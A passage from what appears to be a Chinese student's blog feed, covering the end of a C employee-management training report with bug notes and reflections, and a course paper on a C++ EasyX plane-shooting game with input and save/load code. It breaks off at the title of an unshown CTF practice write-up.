这一块程序是我做出来感觉遗憾最大的一块，在C语言实训最后的答辩中，我看到很多同学在删除这一块下足了功夫，我看到有的同学在删除前增加了是否删除的验证程序，也有的同学在这一块追加了密码输入，以验证执行删除功能的是否是管理员本人。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2 如果有时间，可以尝试增加一个撤销删除的功能，这个功能之前想过，可以令设一个结构体变量暂时存储删除的数据，如果执行撤销删除程序是，则把暂存结构体中的数据写入二进制文件中。<br>#####3.2.9修改员工信息</p><pre class="line-numbers language-none"><code class="language-none">void f_5(struct workers *workers)&#x2F;&#x2F;在文件中读取数据，对数据进行修改，最后在存入文件中。&#123;    struct workers *p;    int j;    struct workers read[NUM];    char find[10];    FILE *fp&#x3D;fopen(&quot;text.dat&quot;,&quot;rb&quot;);    if (fp&#x3D;&#x3D;NULL)    &#123;        printf(&quot;文件打开失败&quot;);        exit(EXIT_FAILURE);    &#125;    fread(read,sizeof(struct workers),NUM,fp);    printf(&quot;请输入要修改的职工号&quot;);    scanf(&quot;%s&quot;,find);    system(&quot;cls&quot;);    for(j&#x3D;0; j&lt;NUM; j++)    &#123;        if(strcmp(read[j].jobNo,find) &#x3D;&#x3D; 0)        &#123;            printf(&quot;\n\n\n\t\t\t&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\n&quot;);            printf(&quot;\t\t\t||                                                         ||\n&quot;);            printf(&quot;\t\t\t||                                                         ||\n&quot;);            printf(&quot;\t\t\t||                                                         ||\n&quot;);            printf(&quot;\t\t\t||   1.修改员工号                   2.修改姓名             ||\n&quot;);            printf(&quot;\t\t\t||                                                         ||\n&quot;);            printf(&quot;\t\t\t||   3.修改性别                     4.修改担任职务         ||\n&quot;);            printf(&quot;\t\t\t||                                                         ||\n&quot;);            printf(&quot;\t\t\t||   5.修改年龄                     6.修改员工工资         ||\n&quot;);            printf(&quot;\t\t\t||                                                         ||\n&quot;);            printf(&quot;\t\t\t||   7.修改员工家庭住址             8.修改员工联系方式     ||\n&quot;);            printf(&quot;\t\t\t||                                                         ||\n&quot;);            printf(&quot;\t\t\t&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\n&quot;);            p &#x3D; (struct workers *)malloc(sizeof(struct workers));            p&#x3D;workers;            int n;            scanf(&quot;%d&quot;,&amp;n);            switch (n)            &#123;            case 1:                printf(&quot;请输入员工号:&quot;);                scanf(&quot;%s&quot;, read[j].jobNo);                break;            case 2:                printf(&quot;请输入姓名:&quot;);                scanf(&quot;%s&quot;,read[j].name);                break;            case 3:                printf(&quot;请输入性别:&quot;);                scanf(&quot;%s&quot;, read[j].sex);                break;            case 4:                printf(&quot;请输入所担任职务:&quot;);                scanf(&quot;%s&quot;, read[j].position);                break;            case 5:                printf(&quot;请输入年龄：&quot;);                scanf(&quot;%s&quot;,read[j].year);                break;            case 6:                printf(&quot;请输入工资:&quot;);                scanf(&quot;%s&quot;,read[j].salary);                break;            case 7:                printf(&quot;请输入家庭住址：&quot;);                scanf(&quot;%s&quot;,read[j].addr);                break;            case 8:                printf(&quot;请输入员工联系方式：&quot;);                scanf(&quot;%s&quot;,read[j].tel);                break;            &#125;        &#125;    &#125;&#x2F;&#x2F;以全部重新输入的形式去替换原本数据，达到修改的目的；    fclose(fp);    fp&#x3D;fopen(&quot;text.dat&quot;,&quot;wb+&quot;);    fwrite(read,sizeof(struct workers),NUM,fp);    if (fp&#x3D;&#x3D;NULL)    &#123;        printf(&quot;文件修改失败&quot;);        exit(EXIT_FAILURE);    &#125;    printf(&quot;修改成功！&quot;);    fclose(fp);    system(&quot;pause&quot;);    system(&quot;cls&quot;);    Hollow();&#x2F;&#x2F;最后返回操作界面；&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>该模块具体执行数据的修改，分成八个部分修改员工的各种信息。</p><h5 id="3-2-10退出程序"><a href="#3-2-10退出程序" class="headerlink" title="3.2.10退出程序"></a>3.2.10退出程序</h5><pre class="line-numbers language-none"><code class="language-none">int f_6(char n)&#x2F;&#x2F;退出程序；&#123;    printf(&quot;感谢您使用本系统，祝您工作愉快\n&quot;);    system(&quot;pause&quot;);    system(&quot;cls&quot;);    return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="4-漏洞分析与修复"><a href="#4-漏洞分析与修复" class="headerlink" title="4.漏洞分析与修复"></a>4.漏洞分析与修复</h2><p>在整个C语言实训中，我不断的制造大大小小的bug，同时也在不断的修复这些bug，以下是我在这个C语言实训中遇到的一些问题。<br>1.起初我对删除文件信息的设计存在无法修复的缺陷，起初的设想是用空格字符串去换结构体数组中的每一项字符串，但做出来，再次浏览时发现位置被空格字符串占据，尝试修改这个被空格占据的结构体，发现无法继续对该位置进行操作，最终决定放弃该思路。<br>2.在浏览全部数据时难以判断存入数据多少；在老师的指导下采用了一个txt文件作为辅助，这一点极其关键，我的这串代码如果缺少了作为辅助的文本文件data.txt实际上是无法运行的，但同时我的程序中也没有代码块，包含对该辅助文件的创建，只有对改文件进行更新，意味着使用改系统，必须手动创建一个文本文件data.txt<br>3.文本文件的读写，将文本文件的信息读入程序时发现存在问题，在文本文件中是以字符型的一个个数字，而在程序中使用我需要的是一个整形数，最后百度找到了一个函数atoi就这个将字符型数转化成整形<br>4.同上一个问题在写入时也有这个问题，然后就找到了一个函数将int类型转化成char数组。<br>5.在添加员工的过程中，一开始使用了wb+却没注意到，发现数据一直存不进去。之后看到打开方式，改成ab+就没问题了。<br>6.在员工登录，执行完查询程序后，意外弹出了管理员的页面，检查程序发现是起初按管理员模式写的操作页面被镶嵌到每一个功能块的最后，而员工直接调用管理员的查询函数照成了该故障，故重写了一个更改过的查询函数，用在员工页面。<br>7.在使用工程解决的时候因为对文件引用不太了解出现了一堆问题，修复了半天。<br>8.其实在查询的时候那个格式真的很难弄，一开始的思路存在问题，起初是根据第一个存入的数据大小更改页面的大小，但是发现只要输入的数据发生改变，就会导致格式不在规范，最后则是由%nd的形式规范</p><h2 id="5-总结反思"><a href="#5-总结反思" class="headerlink" title="5.总结反思"></a>5.总结反思</h2><p>由于我们的C语言的实训，由于开课比较早，专业课没有结束，做项目需要的结构体的知识和文件调用的知识并没有学，最初做起来也是非常困难，利用互联网去查询如何实现文件调用，去看网络上其他人做到程序，通过种种方式去学习这些内容，对我们组每一位组员的自我学习能力都是一个巨大的提高。<br>另一个体会是规划的重要性，我们一开始程序设计分析的时候对规划做得并不好，很多程序功能都是后面有了构思后补充的，如果会进行下一次的实训，系统的构思一定要做好。<br>    生活中我们习以为常的小问题，我们看似毫无新意的小程序，由我们自己实施起来却困难重重，大家都喜欢开程序员的玩笑，说,你怎么还不秃顶。看似调侃却透露出编程的不易，而属于我们的一切才刚刚开始，实训当然是挺难的，没有接触的函数，细小的失误，复杂的逻辑，但所幸我们成功地站在了这里。我们从中吸取了许多教训，我们对以后的学习和生活有了更多的了解。</p><blockquote><p>这是最好的时代，这是最坏的时代，我们仍然年轻，我们仍然伫立。——–致所有在座的各位。</p></blockquote><h2 id="6收获"><a href="#6收获" class="headerlink" title="6收获"></a>6收获</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;实训真的带给我们很多提高，使用的很多函数都是课上没有讲过的，而这里调了一些展示出来</p><blockquote><p>system(“pause”);暂停函数，避免程序运行跳转太快而无法看清数据。<br>system(“cls”);清屏函数，清楚屏幕上的信息，方便程序展示。<br>atoi（）函数将char类型数转化为int类型的数。<br>itoa（）函数将int类型的变量转化为字符串。<br>Sleep（）函数来自Windows.h中的函数，让程序延迟一段时间，登录系统的动画就是应用了该函数<br>fflush(stdin)函数，清空缓冲器，方便后续的文件读写</p></blockquote><p>在其他的方面，如小组合作，自我学习能力，从网络上获取知识的能力都得到显著的提高。</p><h2 id="7-程序演示"><a href="#7-程序演示" class="headerlink" title="7.程序演示"></a>7.程序演示</h2><h2 id="8-鸣谢"><a href="#8-鸣谢" class="headerlink" title="8.鸣谢"></a>8.鸣谢</h2><p>感谢我们大一的C语言黄老师，及负责我们C语言实训的任老师，及协助我完成实训工作的两位同组同学。</p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
            <tag> 程序设计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>课程论文：基于C++的可视化飞机大战游戏</title>
      <link href="/2021/07/31/%E5%9F%BA%E4%BA%8EC++%E7%9A%84%E5%8F%AF%E8%A7%86%E5%8C%96%E9%A3%9E%E6%9C%BA%E5%A4%A7%E6%88%98%E6%B8%B8%E6%88%8F/"/>
      <url>/2021/07/31/%E5%9F%BA%E4%BA%8EC++%E7%9A%84%E5%8F%AF%E8%A7%86%E5%8C%96%E9%A3%9E%E6%9C%BA%E5%A4%A7%E6%88%98%E6%B8%B8%E6%88%8F/</url>
      
        <content type="html"><![CDATA[<hr><p><strong>摘要：</strong> 飞机大战是一款经典的游戏，最早应追溯到打击者1945（Strikers 1945），这是日本彩京公司于1995年发售的飞行射击游戏。本作是参照打击者1945基于visual C++写成的飞行射击类游戏。本作中实现了敌机的产生功能、子弹的发射功能、飞机中弹销毁和计算得分等功能,而且通过文件读写的相关操作完成了存档与读档的相关操作。本作通过便捷的操作方式，使玩家可以轻易地上手该游戏，在游戏中放松心情，释放压力，提高反应能力。游玩该游戏可以为玩家带来欢乐。</p><hr><p>关键词： <strong>可视化</strong> <strong>飞机大战</strong> <strong>游戏设计</strong></p><p>引言 随着社会的不断发展，人们的生活方式也不断的在变化，人们的娱乐方式也越发的多种多样。人们对美好生活的向往，不单单局限于物质生活，人们的精神生活也在一天天的丰富。游戏是很多人精神生活中的一种重要组成部分。毫无疑问飞机大战是一款极其经典的游戏，玩家通过鼠标或键盘操作飞机攻击敌方飞机，躲避碰撞和敌方飞机攻击。极其简单的操作和轻松的上手，使得这一款游戏带给了无数人欢乐。</p><h4 id="1-需求分析"><a href="#1-需求分析" class="headerlink" title="1 需求分析"></a>1 需求分析</h4><p>在飞行射击类游戏中，玩家登陆游戏后可以通过鼠标或键盘操作飞机前进，躲避敌机攻击，并通过点击鼠标左键或空格键发射子弹击败敌机。</p><p>完成这个飞机大战游戏的设计，需要完成用户飞机的移动功能，敌机的产生功能、子弹的发射功能、飞机中弹销毁和计算得分等功能。在用户需要时可以暂停游戏，可以通过文件读写完成存档与读档。为丰富游戏的趣味性，相应增加了各种音效，并会根据用户的得分产生相应的敌机。</p><h4 id="2-关键技术"><a href="#2-关键技术" class="headerlink" title="2 关键技术"></a>2 关键技术</h4><h5 id="2-1-C-面向对象的程序设计"><a href="#2-1-C-面向对象的程序设计" class="headerlink" title="2.1 C++面向对象的程序设计"></a>2.1 C++面向对象的程序设计</h5><p>C++起始于C语言。当C语言发展到巅峰时出现了增加关键词和类的C with class的C语言版本，而这是C语言的一大突破，开发者将这一种语言命名为C++。这便是C++最早的版本。</p><blockquote><p>美国AT&amp;T贝尔实验室的本贾尼·斯特劳斯特鲁普博士在20世纪80年代初期成功地实现了C++，即C with classes。当时C++是作为C语言的加强版本出现，从给C增加类开始，不断增加新的特征<sup>[1]</sup>。</p></blockquote><p>然而就目前而言，C++可以认为它是一门独立的编程语言，它源于C语言但是它并不依赖于C语言。C++与C语言也是有本质差别：在于C++是面向对象的，而C语言是面向过程的。或者说C++是在C语言的基础上增加了面向对象程序设计的新内容，是对C语言的一次更重要的改革，使得C++成为软件开发的重要工具。</p><h5 id="2-2-C-语言的优点"><a href="#2-2-C-语言的优点" class="headerlink" title="2.2 C++语言的优点"></a>2.2 C++语言的优点</h5><p>（1）在C语言的基础上进行扩充和完善，使C++兼容了C语言的面向过程特点，又成为了一种面向对象的程序设计语言。</p><p>（2）可以使用抽象数据类型进行基于对象的编程；      </p><p>（3）可以使用多继承、多态进行面向对象的编程；      </p><p>（4）可以担负起以模版为特征的泛型化编程。      </p><p>（5）C++实现了面向对象程序设计。在高级语言当中，处理运行速度是最快的，大部分的游戏软件，系统都是由C++来编写的。</p><p>（6）C++语言非常灵活，功能非常强大。如果说C语言的优点是指针，那么C++的优点就是性能和类层次结构的设计。</p><p>（7）C++非常严谨、精确和数理化，标准定义很细致。</p><p>（8）C++语言的语法思路层次分明、相呼应;语法结构是显式的、明确的。</p><h5 id="2-3-Visual-C-的优点"><a href="#2-3-Visual-C-的优点" class="headerlink" title="2.3 Visual C++的优点"></a>2.3 Visual C++的优点</h5><p>（1）与Windows紧密结合，MFC类库集成了大量已经预先定义好的类，用户可以根据编程的需要定义相应的类，或根据需要自己定义相应的类。因此Visual C++在使用API等方面和Windows联系的最为紧密<sup>[</sup><sup>2]</sup>。</p><p>（2）强大的类库支持和类改造能力。代码重用是C++追求的目标，重用就是从已有的基类派生出新的C++类；MFC提供了大量的基类供程序员们根据不同的应用要求生成新的类以满足要求。VC++有了MFC，具有非常强大对类改造的能力。只要集成MFC类，稍加修改就可以得到符合要求的控件类或应用类。</p><p>（3）拥有高效的运行速度。高的运行速度取决于两点：1.软件本身编写的质量，2.编程工具的编译质量。因为VC++非常接近Windows底层，所以编译器所编译的质量相当高，从而保证了VC++编写出来的软件产品拥有高效的运行速度<sup>[</sup><sup>3]</sup>。</p><h5 id="2-4-C-的语言体系"><a href="#2-4-C-的语言体系" class="headerlink" title="2.4 C++的语言体系"></a>2.4 C++的语言体系</h5><p>（1）C子语言。C++是以C语言为基础，C++几乎支持C语言的全部功能。</p><p>（2）面向对象的C++。C++首先是一门面向对象的程序设计语言，并以此闻名。</p><p>（3） 泛型编程语言。相比C语言，C++增加了模板，C++强大的模板功能使系统能够在编译期间就能完成许多工作，从而大大提高了运行效率<sup>[</sup><sup>4]</sup>。</p><p>（4）STL。随着STL的不断发展，渐渐成为C++程序设计体系中不可或缺的一部分。其安全性与规范性的优秀使得它受到程序员的欢迎<sup>[</sup><sup>1]</sup>。</p><h4 id="3-游戏总体设计"><a href="#3-游戏总体设计" class="headerlink" title="3.游戏总体设计"></a>3.游戏总体设计</h4><p>游戏被分成两个部分，一部分是与用户输入有关的更新，包括根据鼠标位置或键盘按键进行飞机的移动和炮弹发射等等。另一部分是与用户输入无关的更新，包括子弹移动，敌机移动逻辑等判断。图1为飞机大战程序设计图。</p><p>图1 飞机大战程序设计图</p><h4 id="4-游戏功能实现"><a href="#4-游戏功能实现" class="headerlink" title="4 游戏功能实现"></a>4 游戏功能实现</h4><h5 id="4-1-代码设计"><a href="#4-1-代码设计" class="headerlink" title="4.1 代码设计"></a>4.1 代码设计</h5><p>4.1.1 头文件<br>     (1)<strong>#include<iostream><strong>头文件，包含头文件输入输出流，c++中没有c语言中输入输出语句，而是利用数据流来解决这个问题。要使用比如cout,cin语句输入输出函数。其中#include文件的目的是把多个编译单元公用的内容单独放在一个文件里减少整体代码尺寸，或者提供可跨工程使用的公共代码；<br>   (2)</strong>#include<fstream><strong>头文件#include 是C++的预编译语句，作用是包含对应的文件，在这里是包含C++的STL头文件fstream。在包含了这个文件后，就可以使用fstream中定义的类及各种成员函数了。fstream是C++ STL中对文件操作的合集，包含了常用的所有文件操作。在C++中，所有的文件操作，都是以流(stream)的方式进行的，fstream也就是文件流file stream<sup>[</sup><sup>5]</sup>。<br>  (3)</strong>#include<iomanip><strong>头文件,这个头文件是声明一些 “流操作符”的，比较常用的setw(int);//设置显示宽度、left//right//设置左右对齐、setprecision(int);//设置浮点数的精确度。<br>  (4)</strong>#include<fstream><strong>包含读写文件头文件，实际上是一个输出流的类模板，含有ifstream和ofstream两个派生类。<br>(5)</strong>#include &lt;math.h&gt;</strong> 是包含math头文件的意思，math.h头文件中声明了常用的一些数学运算，比如乘方，开方运算等等。<br>(6)**#include&lt;graphics.h&gt;**头文件是C语言和visual studio的图形库文件，包含像素函数、线型函数、画线函数、相对画线函数等多种函数，可进行图形的快速编程。这也是实现可视化的最重要工具。使用easyx.exe，可以直接运行安装图形库到visual studio。然后直接使用。<br>(7)#include&lt;windows.h&gt;头文件是最重要的头文件之一，它包含了其他Windows头文件，这些头文件也包含了其他头文件，其中有用户界面函数&lt;Winuser.h&gt;、图形设备接口函数&lt;Wingdi.h&gt;<sup>[</sup><sup>6]</sup>。<br>(8)#include&lt;conio.h&gt;是Console Input/Output（控制台输入输出）的简写，其中定义了通过控制台进行数据输入和数据输出的函数，主要是一些用户通过按键盘产生的对应操作，比如getch()函数等等<sup>[</sup><sup>4]</sup>。<br>(9)#pragma comment(lib,”Winmm.lib”)声明程序使用了winmm.lib库，这个库是是Windows多媒体相关应用程序接口，用于低档的音频和游戏手柄。可以用来实现音频的添加和利用。在该飞机大战程序中这个库中的内容实现了游戏运行时中的背景音乐的开始和结束放映等功能。</p><p>4.1.2使用函数</p><p>settextstyle() 设置文本型式函数，函数settextstyle() 设置图形文本当前字体、文本显示方向（水平显示或垂直显示）以及字符大小。在使用中用于显示得分和成绩。通常与Outtextxy配套使用。</p><p>Outtextxy()函数，这个函数用于在指定位置输出字符串。</p><p>loadimageLoadImage()函数，功能是装载图标，光标，或位图。在本程序中用于加载图片。</p><p>Initgraph()函数功能为初始化图形系统。pathtodriver表示存放图形驱动文件的路径。</p><p>SetTextColor()，Windows API 函数，设置指定DC中的文字颜色。</p><p>kbhit()是一个C和C++函数，用于非阻塞地响应键盘输入事件。其中文可译为“键盘敲击”(keyboard hit)，注意这个函数在高版本VC下已被淘汰，应使用_kbhit()函数。</p><p>MouseHit()函数是实现鼠标操作最关键的函数，用于判断是否有鼠标信息。<sup>[</sup><sup>5]</sup>使用MouseHit()函数效果与kbhit()函数效果类似，如果没有鼠标信息自动跳过。避免了因为没有鼠标信息导致程序无法运行的状况<sup>[7]</sup>。</p><p>getch()是编程中所用的函数，这个函数是一个不回显函数，当用户按下某个字符时，函数自动读取，无需按回车，有的C语言命令行程序会用到此函数做游戏，但是这个函数并非标准函数。在高版本VC或者VS中已经无法使用应该使用_getch()函数<sup>[8]</sup>。</p><p>SetBkMode()函数这就需要使用SetBkMode函数来设置DrawText函数的输出方式，显示设备共有两种输出方式：OPAQUE和TRANSPARENT。OPAQUE的方式是用当前背景的画刷的颜色输出显示文字的背景，而TRANSPARENT是使用透明的输出，也就是文字的背景是不改变的。</p><p><a href="https://baike.baidu.com/item/MCI">MCI</a>(Media Control Interface，媒体控制接口)函数中，有些只适用于一种<a href="https://baike.baidu.com/item/%E6%8E%A5%E5%8F%A3%E6%96%B9%E5%BC%8F/4582310">接口方式</a>，有些则两种接口都可以用。mciSendString只适用于命令串接口方式（命令串中不区分大小写）以形如mciSendString(“play movie”,buf,sizeof(buf),NULL);的方式进行音频播放，以形如mciSendString(“pause movie”,buf,sizeof(buf),NULL);的方式暂停播放。以形如mciSendString(“close movie”,buf,sizeof(buf),NULL)的形式关闭播放。</p><h5 id="4-2操作逻辑"><a href="#4-2操作逻辑" class="headerlink" title="4.2操作逻辑"></a>4.2操作逻辑</h5><p>本程序使用两种操作方式，依靠键盘按键操作和依靠鼠标位置进行操作。图2为飞机移动操作逻辑示意图。</p><center>图2 飞机移动操作逻辑示意图</center>使用鼠标操作代码如下：<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">if (isExpolde &#x3D;&#x3D; 0)&#123;    MOUSEMSG m;    while (MouseHit())    &#123;        m &#x3D; GetMouseMsg();        if(m.uMsg &#x3D;&#x3D; WM_MOUSEMOVE)        &#123;            position_x &#x3D; m.x;            position_y &#x3D; m.y;        &#125;        else if (m.uMsg &#x3D;&#x3D; WM_LBUTTONDOWN)        &#123;            bullet_x &#x3D; position_x;            bullet_y &#x3D; position_y - 85;        &#125;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对应的使用键盘操作代码为：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">char input;if (_kbhit())  &#x2F;&#x2F; 判断是否有输入&#123;    input &#x3D; _getch();  &#x2F;&#x2F; 根据用户的不同输入来移动，不必输入回车    if (input &#x3D;&#x3D; 27) &#x2F;&#x2F; ESC键的ACSII码为27        gameStatus &#x3D; 3;    if (input &#x3D;&#x3D; &#39;a&#39;)        position_x -&#x3D; 10;    if (input &#x3D;&#x3D; &#39;d&#39;)        position_x +&#x3D; 10;    if (input &#x3D;&#x3D; &#39;w&#39;)        position_y +&#x3D; 10;    if (input &#x3D;&#x3D; &#39;s&#39;)        position_y -&#x3D; 10;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>先定义MOUSEMSG的鼠标类型参数m;通过<strong>while (MouseHit())</strong> 进行操作，既能保证能够使用鼠标进行操作也避免了，在没有鼠标操作时游戏的停止。</p><p>类似的有定义char 类型的的变量通过**while(_kbhit())<strong>来进行是否有键盘信息的判断，用</strong>_getch()**函数获取键盘的敲击值。</p><h5 id="4-3-与用户输出无关的逻辑"><a href="#4-3-与用户输出无关的逻辑" class="headerlink" title="4.3 与用户输出无关的逻辑"></a>4.3 与用户输出无关的逻辑</h5><p><strong>4.3.1 敌机生成逻辑</strong></p><p>使用rand()函数生成一个最大为32767的数，并通过%(Width-50)得到飞机的初始坐标，并同时将blood等参数复原。</p><p><strong>4.3.2 敌机简单移动逻辑</strong><br>代码如下:</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">if (enemy_y &lt; High - 25)&#123;    if (enemy_x &#x3D;&#x3D; 0)        flag &#x3D; 0;    if (enemy_x &#x3D;&#x3D; 500)        flag &#x3D; 1;    enemy_y &#x3D; enemy_y + 1;    if (flag &#x3D;&#x3D; 1)        enemy_x &#x3D; enemy_x--;    else enemy_x &#x3D; enemy_x++;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>该模块通过定义全局变量static flag 进行操控飞机的飞行方向，同时在每个循环过程中使飞机能够实现摆动下降。</p><h5 id="4-4暂停页面与存储逻辑"><a href="#4-4暂停页面与存储逻辑" class="headerlink" title="4.4暂停页面与存储逻辑"></a>4.4暂停页面与存储逻辑</h5><p>通过**_getch()**函数读取输入，如存在按键为Esc时，将gameStatus设置为3，出现暂停页面，图3为游戏暂停页面。<br>图3 游戏暂停页面<br>游戏数据储存逻辑</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">void read<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    ifstream file2<span class="token punctuation">;</span><span class="token operator">//</span>输入指针    file2<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"../data.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    file2 <span class="token operator">>></span> position_x <span class="token operator">>></span> position_y <span class="token operator">>></span> bullet_x <span class="token operator">>></span> enemy_x <span class="token operator">>></span> enemy_y <span class="token operator">>></span> isExpolde <span class="token operator">>></span> score<span class="token punctuation">;</span>    file2<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>void write<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    ofstream file1<span class="token punctuation">;</span>    file1<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"./data.txt"</span><span class="token punctuation">,</span> std<span class="token punctuation">:</span><span class="token punctuation">:</span>ios<span class="token punctuation">:</span><span class="token punctuation">:</span>app<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>!file1<span class="token punctuation">.</span>is_open<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     <span class="token punctuation">&#123;</span>        std<span class="token punctuation">:</span><span class="token punctuation">:</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"打开文件失败！！\n"</span><span class="token punctuation">;</span>        exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    file1 <span class="token operator">&lt;&lt;</span> position_x <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span> <span class="token operator">&lt;&lt;</span> position_y <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span> <span class="token operator">&lt;&lt;</span> bullet_x <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span> <span class="token operator">&lt;&lt;</span> enemy_x <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span> <span class="token operator">&lt;&lt;</span> enemy_y <span class="token operator">&lt;&lt;</span><span class="token string">" "</span> <span class="token operator">&lt;&lt;</span> isExpolde <span class="token operator">&lt;&lt;</span><span class="token string">" "</span> <span class="token operator">&lt;&lt;</span> score <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>    file1<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过ifstream和ofstream两个类进行操作，实现数据的存储于写入。也通过键盘操作识别Esc按钮实现暂停操作。</p><p>图4为飞机大战程序登录界面，图5为程序运行截图。</p><center>  图4 程序登录界面 </center><center> 图5 程序运行截图</center>#### 5.总结<p>基于C++的可视化飞机大战游戏是一个简单的可视化的小游戏，玩家能够通过鼠标或键盘进行操控飞机的移动和攻击，并且运用了文件操作技术，可以实现数据的永久性保存。基于C++的飞机大战游戏是采用C++语言及其easyX拓展模块开发完成的。本项目实现了游戏流程中的所有功能，界面布局更加人性化,并有着良好的可扩展性。但游戏依旧存在一些不足之处，比如说本游戏还没有实现对玩家操纵飞机进行血量的显示，敌方飞机尚无法发射子弹，对击中逻辑的判断还存在问题。</p><h4 id="参考文献："><a href="#参考文献：" class="headerlink" title="参考文献："></a>参考文献：</h4><p>[1]黄宝贵等.C++面向对象程序设计[M] 北京:清华大学出版社，2019:2-3<br>[2]童晶编著.C语言程序设计与游戏开发实践教程[M] 北京:清华大学出版社 2017:16<br>[3]黄维通等.Visual C++面向对象与可视化程序设计[M]（第三版）北京:清华大学出版社 2011:14<br>[4]郑莉等编著.C++程序设计语言(第三版)[M].北京:清华大学出版社,2005:134-139.<br>[5]刘振安等编著.C++程序设计课程设计[M] 北京:机械工业出版社,2004:23-31  [6]朱立华等编著.面向对象程设计及C++[M].北京:人民邮电出版社,2008:43  [7]郑莉,董渊.C++语言程序设计(第二版) [M].北京清华大学出版社,2002:23  [8]陈维兴,林小茶.C++面向对象程序设计教程(第2版)[M].北京清华大学出版社.2007:34</p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>QFNUCTF春季练习赛结题记录</title>
      <link href="/2021/07/30/QFNUCTF%E6%98%A5%E5%AD%A3%E7%BB%83%E4%B9%A0%E8%B5%9B%E7%BB%93%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2021/07/30/QFNUCTF%E6%98%A5%E5%AD%A3%E7%BB%83%E4%B9%A0%E8%B5%9B%E7%BB%93%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
